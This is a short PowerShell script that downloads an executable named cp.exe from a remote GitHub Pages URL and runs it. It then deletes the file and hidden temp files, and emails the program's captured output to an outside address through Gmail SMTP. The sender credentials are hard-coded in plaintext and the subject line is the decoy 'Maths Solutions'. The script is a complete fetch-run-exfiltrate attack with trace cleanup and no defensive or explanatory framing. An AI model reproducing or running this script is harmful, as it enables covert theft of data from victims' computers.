$url = "https://redcoconut.github.io/Redc/cp.exe"
$output = "C:/Users/$env:UserName/Downloads"
$start_time = Get-Date
Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output
#OR
Start-BitsTransfer -Source $url -Destination $output -Asynchronous
Write-Output "Time taken: $((Get-Date).Subtract($start_time).Seconds) second(s)"

cd C:/Users/$env:UserName/Downloads
$One = cmd /c 'cp.exe'
cmd /c "del /f cp.exe"
cmd /c "del /A:H *.tmp"

$Username = "coconut.donni@gmail.com";
 $Password = "going2testc";
 $mees= "$One"
 function Send-ToEmail([string]$email, [string]$attachmentpath){

     $message = new-object Net.Mail.MailMessage;
     $message.From = "coconut.donni@gmail.com";
     $message.To.Add($email);
     $message.Subject = "Maths Solutions";
     $message.Body = $mees
     $smtp = new-object Net.Mail.SmtpClient("smtp.gmail.com", "587");
     $smtp.EnableSSL = $true;
     $smtp.Credentials = New-Object System.Net.NetworkCredential($Username, $Password);
     $smtp.send($message);
     write-host "Mail Sent" ;
  }
 Send-ToEmail  -email "coconut.donni@innocent.com" -attachmentpath $path;
